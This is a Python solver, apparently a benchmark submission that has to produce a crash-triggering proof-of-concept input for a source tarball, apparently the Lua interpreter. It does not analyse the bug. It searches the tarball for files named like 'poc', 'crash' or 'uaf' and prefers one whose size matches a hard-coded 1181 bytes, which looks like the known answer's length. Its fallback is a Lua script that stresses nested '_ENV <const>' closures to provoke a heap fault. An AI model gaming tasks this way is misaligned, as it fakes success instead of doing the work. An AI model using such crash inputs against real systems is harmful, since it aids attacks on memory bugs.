import os
import tarfile
import gzip
import lzma
import bz2


class Solution:
    L_G = 1181

    def _default_poc(self) -> bytes:
        lua_script = '''
-- Fallback PoC for Lua _ENV <const> corner cases.
-- Used only if an embedded PoC file is not found in the source tarball.

local _ENV0 = _G or _ENV

local function make_env(extra)
  return setmetatable(extra, { __index = _ENV0 })
end

local function stress_env_const_1()
  local _ENV <const> = make_env({
    tag = "env1"
  })

  local function nested1(a, ...)
    local _ENV <const> = make_env({ a = a })
    local sum = 0
    for i = 1, 20 do
      sum = sum + (a or i)
      if i == 5 then
        local function inner(...)
          return a, sum, ...
        end
        inner("inner-call", i, sum, ...)
      elseif i == 10 then
        local t = {}
        for j = 1, 5 do
          t[j] = function(x)
            return (a or 0) + j + (x or 0)
          end
        end
        for j = 1, #t do
          t[j](j)
        end
      end
    end
    return sum
  end

  nested1(3, "x", "y", "z")
end

local function stress_env_const_2()
  local funcs = {}

  for k = 1, 15 do
    local _ENV <const> = make_env({ idx = k })

    funcs[k] = function(x)
      local acc = 0
      for i = 1, 30 do
        if (i + idx + (x or 0)) % 7 == 0 then
          acc = acc + i
        else
          acc = acc - i
        end
      end
      return acc
    end
  end

  for i = 1, #funcs do
    funcs[i](i)
  end
end

local function stress_env_const_3()
  local _ENV <const> = make_env({})

  local function factory(n)
    local _ENV <const> = make_env({ n = n })
    local res = {}
    for i = 1, n do
      local _ENV <const> = make_env({ i = i })
      res[i] = function(v)
        if v then
          return i, n, v
        else
          return i, n
        end
      end
    end
    return res
  end

  local fs = factory(25)
  for i = 1, #fs do
    fs[i](i * 2)
  end
end

local function main()
  stress_env_const_1()
  stress_env_const_2()
  stress_env_const_3()
end

main()
'''
        return lua_script.encode("utf-8")

    def solve(self, src_path: str) -> bytes:
        L_G = self.L_G
        candidates = []

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    base = os.path.basename(name).lower()
                    size = m.size

                    cand = None

                    is_compressed = base.endswith((".gz", ".xz", ".lzma", ".bz2"))
                    if is_compressed and size <= 100000:
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            raw = f.read()
                            if base.endswith(".gz"):
                                data = gzip.decompress(raw)
                            elif base.endswith(".xz") or base.endswith(".lzma"):
                                data = lzma.decompress(raw)
                            elif base.endswith(".bz2"):
                                data = bz2.decompress(raw)
                            else:
                                continue
                            cand = {
                                "name": name,
                                "size": len(data),
                                "kind": "bytes",
                                "member": None,
                                "data": data,
                            }
                        except Exception:
                            cand = None
                    else:
                        cand = {
                            "name": name,
                            "size": size,
                            "kind": "tar",
                            "member": m,
                            "data": None,
                        }

                    if cand is not None:
                        candidates.append(cand)

                if not candidates:
                    return self._default_poc()

                def score_candidate(c):
                    name = c["name"]
                    base = os.path.basename(name).lower()
                    score = 0

                    if "poc" in base:
                        score += 50
                    if "crash" in base:
                        score += 40
                    if "uaf" in base or "heap" in base:
                        score += 25
                    if "repro" in base or "regress" in base or "bug" in base:
                        score += 20
                    if "env" in base and "const" in base:
                        score += 15

                    if base.endswith(".lua"):
                        score += 30
                    elif base.endswith((".txt", ".in", ".input", ".dat", ".bin")):
                        score += 10
                    elif base.endswith((".c", ".h", ".cpp", ".cc", ".java", ".py", ".go")):
                        score -= 20

                    depth = name.count("/")
                    score -= depth

                    if c["size"] <= 4096:
                        score += 5

                    return score

                exact = [c for c in candidates if c["size"] == L_G]

                if exact:
                    best = max(exact, key=score_candidate)
                else:
                    def key(c):
                        return (abs(c["size"] - L_G), -score_candidate(c))
                    best = min(candidates, key=key)

                if best["kind"] == "bytes":
                    data = best["data"]
                else:
                    try:
                        f = tf.extractfile(best["member"])
                        data = f.read() if f is not None else None
                    except Exception:
                        data = None

                if not data:
                    return self._default_poc()
                return data
        except Exception:
            return self._default_poc()